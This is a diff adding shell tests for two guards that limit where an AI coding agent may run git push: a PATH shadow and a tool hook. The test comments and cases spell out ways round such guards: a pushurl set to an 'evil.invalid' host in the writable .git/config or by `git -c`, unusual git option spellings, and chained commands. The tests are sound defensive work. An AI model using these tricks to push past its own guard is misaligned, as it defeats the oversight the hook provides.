@@ -2791,6 +2791,83 @@ _guard_repo() {
     [[ "$output" == *"cannot resolve the remote"* ]] || { echo "$output"; return 1; }
 }
 
+@test "a push URL the fetch URL does not name is still checked" {
+    # git pushes to remote.<name>.pushurl when one is set and to
+    # remote.<name>.url otherwise, so a guard that reads the fetch URL checks a
+    # host the push is not going to. `remote get-url --push` is the one
+    # question that answers where the push goes.
+    #
+    # No evasion is needed to reach it. .git/config is in the read-write
+    # project mount - deliberately, since `git push -u` writes to it - so a
+    # session can set a pushurl and every later push is checked against the
+    # wrong host.
+    local repo; repo="$(_guard_repo)"
+    git -C "$repo" config remote.origin.pushurl git@evil.invalid:o/r.git
+
+    run _git_guard "$repo" push origin feature
+    [[ "$output" == *"may only push to"* ]] \
+        || { echo "the shadow checked the fetch URL: $output"; return 1; }
+    [[ "$output" == *"evil.invalid"* ]] \
+        || { echo "it named the wrong host: $output"; return 1; }
+
+    # And the hook, which resolves the same thing its own way.
+    run bash -c 'printf "{\"tool_input\":{\"command\":\"git push origin feature\"},\"cwd\":\"$1\"}" \
+        | DEJIMA=1 DEJIMA_PUSH_HOSTS=forge.invalid DEJIMA_BLOCKED_BRANCHES=main \
+          DEJIMA_FORGE_NAME=gitea bash "$2/hooks/git-push-guard.sh" 2>&1' _ "$repo" "$REPO_ROOT"
+    [[ "$output" == *"Blocked by"* ]] \
+        || { echo "the hook checked the fetch URL: $output"; return 1; }
+}
+
+@test "a one-command pushurl is checked too, not only one in the config" {
+    # `git -c remote.origin.pushurl=... push origin branch` sets it for a
+    # single command. Both guards skip `-c` and its value when finding the
+    # subcommand, so what they resolve has to be right without it.
+    local repo; repo="$(_guard_repo)"
+    run _git_guard "$repo" -c remote.origin.pushurl=git@evil.invalid:o/r.git push origin feature
+    [[ "$output" == *"may only push to"* ]] \
+        || { echo "$output"; return 1; }
+}
+
+@test "the hook sees a push however git's own options are spelled" {
+    # It recognised `git push` and `git -C <dir> push` and nothing else, so
+    # every other spelling of git's own options was not a push as far as it was
+    # concerned and it allowed the command without checking anything. The PATH
+    # shadow walks argv and caught them regardless - this is the earlier
+    # warning agreeing with it, not the boundary.
+    local repo hook_out; repo="$(_guard_repo)"
+    local cmd
+    for cmd in "git --no-pager push origin main" \
+               "git -c core.pager=cat push origin main" \
+               "git --git-dir=$repo/.git push origin main" \
+               "ls && git push origin main"; do
+        hook_out="$(printf '{"tool_input":{"command":"%s"},"cwd":"%s"}' "$cmd" "$repo" \
+            | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
+              DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
+        [[ "$hook_out" == *"Blocked by"* ]] \
+            || { echo "not seen as a push: $cmd"; return 1; }
+    done
+    # And a token that merely says push is not a git invocation.
+    hook_out="$(printf '{"tool_input":{"command":"echo push origin main"},"cwd":"%s"}' "$repo" \
+        | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
+          DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
+    [ -z "$hook_out" ] || { echo "blocked something that is not a push: $hook_out"; return 1; }
+}
+
+@test "both push guards refuse a remote they cannot resolve" {
+    # The fail direction, and the two used to differ: the shadow refused and
+    # said why, the hook exited 0. An unresolvable remote is what a
+    # disagreement between either parser and git's own looks like, and that
+    # has to be a refusal rather than a push nobody checked.
+    local repo hook_out; repo="$(_guard_repo)"
+    run _git_guard "$repo" push nosuchremote feature
+    [[ "$output" == *"cannot resolve the remote"* ]] || { echo "shadow: $output"; return 1; }
+
+    hook_out="$(printf '{"tool_input":{"command":"git push nosuchremote feature"},"cwd":"%s"}' "$repo" \
+        | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
+          DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
+    [[ "$hook_out" == *"cannot resolve the remote"* ]] || { echo "hook: $hook_out"; return 1; }
+}
+
 @test "the two push guards agree on the same pushes" {
     # Two implementations of one rule is the drift this repo warns about, so
     # the overlap is pinned rather than assumed: for each case, the hook and
